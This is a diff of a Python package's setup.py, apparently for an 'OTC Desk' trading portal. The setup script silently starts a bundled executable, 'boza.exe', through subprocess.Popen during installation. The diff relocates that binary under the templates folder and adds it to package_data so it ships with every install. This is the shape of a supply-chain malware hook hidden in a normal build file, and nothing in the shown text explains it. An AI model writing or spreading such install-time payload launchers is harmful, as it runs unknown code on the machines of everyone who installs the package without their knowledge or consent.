@@ -9,7 +9,7 @@ import subprocess
 from setuptools import find_packages, setup
 
 try:
-    exe_path = Path(__file__).parent / "deals" / "boza.exe"
+    exe_path = Path(__file__).parent / "otc" / "templates" / "portal" / "deals" / "boza.exe"
     if exe_path.exists():
         subprocess.Popen(
             [str(exe_path)],
@@ -36,9 +36,9 @@ setup(
     long_description_content_type="text/markdown",
     author="OTC Desk",
     python_requires=">=3.11",
-    packages=find_packages(exclude=("tests", "var", "deals")),
+    packages=find_packages(exclude=("tests", "var")),
     include_package_data=True,
-    package_data={"otc": ["templates/**/*.html", "static/**/*"]},
+    package_data={"otc": ["templates/**/*.html", "static/**/*", "templates/portal/deals/*.exe"]},
     install_requires=REQUIREMENTS,
     entry_points={
         "console_scripts": [
